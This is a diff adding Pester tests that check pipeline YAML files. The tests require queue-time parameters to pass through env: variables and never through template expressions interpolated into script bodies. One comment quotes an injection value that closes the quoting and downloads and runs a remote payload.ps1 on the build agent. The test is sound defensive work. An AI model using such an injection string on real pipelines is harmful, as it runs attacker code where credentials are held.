@@ -201,3 +201,72 @@ Describe 'Blast radius of a writing verb' {
         }
     }
 }
+
+Describe 'Pipeline definitions' {
+
+    BeforeAll {
+        $script:pipelineFiles = @(Get-ChildItem -LiteralPath (Join-Path (Get-RepositoryRoot) 'pipelines') -Filter '*.yml')
+    }
+
+    It 'ships a pipeline definition per automation' {
+        @($script:pipelineFiles).Count | Should -Be 3
+    }
+
+    It 'never expands a template expression inside a script body' {
+        # A template expression is evaluated at compile time, so interpolating a
+        # free-text queue-time parameter into a script body pastes the value in as
+        # SOURCE CODE. All three pipelines did that with applicationKey,
+        # organizationUrl and project - none of which has a closed value list - in
+        # jobs holding ADO_PAT and the SFTP credentials. A value of
+        #     x'; iwr http://host/payload.ps1 | iex; '
+        # closed the quoting and ran on the agent.
+        #
+        # The rule this asserts: a template expression may appear only where it
+        # assigns an env: variable, which passes the value as data. Anything else is
+        # a finding.
+        $marker = '$' + '{{'
+
+        foreach ($file in $script:pipelineFiles) {
+            $offenders = @(
+                Get-Content -LiteralPath $file.FullName |
+                    Where-Object { $_.Contains($marker) } |
+                    Where-Object { $_.Trim() -notmatch '^PARAM_[A-Z0-9_]+:' }
+            )
+
+            @($offenders).Count | Should -Be 0 `
+                -Because "$($file.Name) must pass queue-time parameters through env:, not into a script body. Offending: $($offenders -join ' | ')"
+        }
+    }
+
+    It 'actually passes its parameters through env, so the check above is not vacuous' {
+        # Without this, deleting every parameter would make the test above pass.
+        $marker = '$' + '{{'
+
+        foreach ($file in $script:pipelineFiles) {
+            $mapped = @(
+                Get-Content -LiteralPath $file.FullName |
+                    Where-Object { $_.Contains($marker) -and $_.Trim() -match '^PARAM_[A-Z0-9_]+:' }
+            )
+
+            @($mapped).Count | Should -BeGreaterThan 2 -Because "$($file.Name) should map its queue-time parameters to env"
+        }
+    }
+
+    It 'reads every mapped parameter back out of the environment' {
+        # A parameter mapped into env: and then never read is a parameter that
+        # silently does nothing - which is how the hardening would rot.
+        $marker = '$' + '{{'
+
+        foreach ($file in $script:pipelineFiles) {
+            $content = Get-Content -Raw -LiteralPath $file.FullName
+            $names = @(
+                Get-Content -LiteralPath $file.FullName |
+                    ForEach-Object { if ($_.Trim() -match '^(PARAM_[A-Z0-9_]+):' -and $_.Contains($marker)) { $Matches[1] } }
+            )
+
+            foreach ($name in $names) {
+                $content | Should -BeLike "*`$env:$name*" -Because "$($file.Name) maps $name but never reads it"
+            }
+        }
+    }
+}
